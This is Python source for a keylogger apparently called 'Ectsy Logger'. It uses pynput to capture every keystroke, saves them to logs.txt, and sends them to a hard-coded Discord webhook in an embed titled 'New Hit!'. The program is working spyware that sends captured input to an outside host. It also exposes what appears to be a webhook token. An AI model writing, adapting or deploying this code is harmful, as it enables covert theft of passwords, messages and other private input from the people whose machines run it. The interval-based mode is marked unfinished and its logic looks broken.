import pynput
from pynput.keyboard import Listener, Key
import time
from colorama import Fore
from discord_webhook import DiscordWebhook, DiscordEmbed
from time import ctime
import requests


words = []
caps_lock = False
art = r'''
___________       __                  .____                                      
\_   _____/ _____/  |_  _________.__. |    |    ____   ____   ____   ___________ 
 |    __)__/ ___\   __\/  ___<   |  | |    |   /  _ \ / ___\ / ___\_/ __ \_  __ |
 |        \  \___|  |  \___ \ \___  | |    |__(  <_> ) /_/  > /_/  >  ___/|  | \/
/_______  /\___  >__| /____  >/ ____| |_______ \____/\___  /\___  / \___  >__|   
        \/     \/          \/ \/              \/    /_____//_____/      \/       
'''

print(Fore.GREEN + art)
time.sleep(0.5)
print('\n')

def get_status():
    return input(Fore.GREEN + 'Enter 0 to proceed with default config / 1 to use interval-based logging > ').strip()

status = get_status()

if status != '1' and status != '0':
    print(Fore.RED + 'Please enter a valid response')
    status = get_status()
print(Fore.BLUE + "Keylogging Began, hit 'f9' to exit. 'Esc' to toggle a manual log")

t = time.time()
current_time = ctime(t)

# ---------------------------- INTERACTION-BASED MODULE --------------------------------

def click_0(key):
    global words, caps_lock, content

    start_time = time.time()
    char = ''
    if key == Key.space:
        words.append(' ')  
    elif key == Key.backspace:
        if words:  
            if words[-1]:  
                words[-1] = words[-1][:-1] 

    elif key == Key.caps_lock:
        caps_lock = not caps_lock

    elif key == Key.shift:
        if words:
            print('')

    elif key == Key.enter:
        if words:
            words += '\n'

    elif len(words) >= 20:
        print('logs written to localfile // logs sent to webhook')
        write_file(words)
        time.sleep(0.3)
        words =[]

# manual log, every time 'esc' is clicked there will be logs
    elif key == Key.esc:
        print('logs written to localfile // logs sent to webhook')
        write_file(words)
        words = []

    elif key == Key.f9:
        print('exiting...')
        time.sleep(1)
        exit()
    
    else:
        if words:  
            words[-1] += getattr(key, 'char', str(key)) 
        if caps_lock:
            char = char.upper()
        if words:
            words[-1] += char
        else:
            words.append(getattr(key, 'char', str(key))) 

# ------------------------- INTERVAL-BASED MODULE (in the works) ----------------------------

def click_1(key):
    global words, caps_lock

    interval = 15

    while key != Key.esc:  
        char = ''
        start_time = time.time()

        # Process key presses
        if key == Key.space:
            words.append(' ')
        elif key == Key.backspace:
            if words and words[-1]:
                words[-1] = words[-1][:-1]
        elif key == Key.caps_lock:
            caps_lock = not caps_lock
        elif key == Key.shift:
            if words:
                print('')
        elif key == Key.enter:
            if words:
                words.append('\n')
        else:
            if words:
                words[-1] += getattr(key, 'char', str(key))
            if caps_lock:
                char = char.upper()
            if words:
                words[-1] += char
            else:
                words.append(getattr(key, 'char', str(key)))

        if time.time() - start_time >= interval:
            print('Logs written to logs.txt!') 
            write_file(words)
            time.sleep(0.2) 
            print('Logs sent to webhook!')
            time.sleep(0.3)


# ------------------------- LOGGING ----------------------
def write_file(words):
    global content
    with open('logs.txt', 'w') as f:
        for word in words:
            f.write(word + ' ')
    time.sleep(1)

    with open('logs.txt', 'r') as f:
        content = ("`" + f.read() + "`").strip()
        webhook_url = "https://discord.com/api/webhooks/1249777345796247593/If_oyH2HtDdeuIULk8A17-IE_HHfovHgaB_ic3Wzi1ublagruEPUJGtPTEsV36srmgdS"
    webhook = DiscordWebhook(url=webhook_url)
    embed = DiscordEmbed(title="New Hit!", description= f' {content} ' '\n' + '\n' + f'logged at {current_time}', color="03b2f8")
    webhook.add_embed(embed)
    response = webhook.execute()

def on_press(key):
    if status  == '0':
        click_0(key)
    elif status == '1':
        click_1(key)

# ------------------------------- LISTENER ----------------------------------
with Listener(on_press=on_press) as listener:
    listener.join()